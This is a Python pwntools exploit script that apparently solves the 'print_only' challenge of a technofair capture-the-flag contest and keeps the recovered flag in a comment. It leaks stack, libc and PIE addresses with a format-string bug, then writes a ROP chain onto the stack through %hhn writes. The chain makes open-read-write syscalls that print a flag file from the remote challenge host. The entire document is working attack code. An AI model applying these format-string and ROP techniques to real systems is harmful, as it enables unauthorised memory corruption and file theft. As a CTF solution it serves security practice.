#!/usr/bin/python3
from pwn import *
PATH = './print_only'
GDBSCRIPT = '''
b *0x555555555352
b *0x55555555536d
'''
HOST = '172.17.0.2'
PORT = 4444

HOST = '103.152.242.172'
PORT = 60903
def debug(gdbscript):
    if type(r) == process:
        gdb.attach(r, gdbscript , gdb_args=["--init-eval-command='source~/peda/peda.py'"])

def fmt_str(addr, value, offset, length=8, add=b""):
    p_fmt = b''
    p_addr = b''
    prev = 0
    for i in range(length):
        p_fmt += b"%%%dx%%%d$hhn" % ((value & 0xFF)+0x100-prev, offset+i)
        p_addr += p64(addr+i)
        prev = (value & 0xff)
        value >>= 8
    if add:
        p_fmt = add + b'\n'
    p_fmt = p_fmt.ljust(0xd0, b"A")
    r.send(p_fmt + p_addr) ; sleep(0.2)
    r.recv()

syscall_ret = pop_rax = pop_rdx = pop_rsi = pop_rdi = 0

def syscall(rax, rdi, rsi, rdx):
    chain = p64(pop_rax) + p64(rax)
    chain += p64(pop_rdi) + p64(rdi)
    chain += p64(pop_rsi) + p64(rsi)
    chain += p64(pop_rdx) + p64(rdx) + p64(0xdeadbeef)
    chain += p64(syscall_ret)
    return chain

def exploit(r):
    global syscall_ret, pop_rax, pop_rdx, pop_rsi, pop_rdi
    r.sendline('%p %p %75$p %68$p')
    leaks = r.recvline(0).split()
    stack = int(leaks[0], 16) + 0x218

    libc_leak = int(leaks[2], 16)
    pie = int(leaks[3], 16) - 0x1120
    bss = pie + 0x4070
    # libc.address = libc_leak - libc.sym['__libc_start_main'] - 243
    libc.address = libc_leak - libc.sym['__libc_start_main'] -234
    info(f'STACK {stack:x}')
    info(f'LEAK {libc_leak:x}')
    info(f'LIBC {libc.address:x}')
    info(f'PIE {pie:x}')

    context.arch = 'amd64'

    pop_rax = libc.search(asm('pop rax ; ret')).__next__()
    pop_rdi = libc.search(asm('pop rdi ; ret')).__next__()
    pop_rsi = libc.search(asm('pop rsi ; ret')).__next__()
    pop_rdx = libc.search(asm('pop rdx ; pop r12 ; ret')).__next__()
    syscall_ret = libc.search(asm('syscall ; ret')).__next__()

    rop = syscall(0, 0, bss, 0x100)
    rop += syscall(2, bss, 0, 0)
    # # rop += syscall(78, 0x5, bss, 0x100)
    rop += syscall(0, 5, bss, 0x100)
    rop += syscall(1, 1, bss, 0x100)
    # # technofair{ORW_str1ng_Ori3nted_pr0gramm1ng_ocoCcivi6xRCIvIq}
    for offset in range(8, len(rop), 8):
        fmt_str(stack+offset, u64(rop[offset:offset+8]), 32)
    fmt_str(stack, u64(rop[:8]), 32)
    sleep(0.5)
    # r.send('/app/flag_Itsxu6lsHixM4Yvl.txt')
    # r.send('./flag.txt')
    r.interactive()

if __name__ == '__main__':
    elf = ELF(PATH)

    if args.REMOTE:
        r = remote(HOST, PORT)
        libc = ELF('./libc.so.6', 0)
    else:
        r = process(PATH, aslr=0)
        libc = elf.libc
    exploit(r)
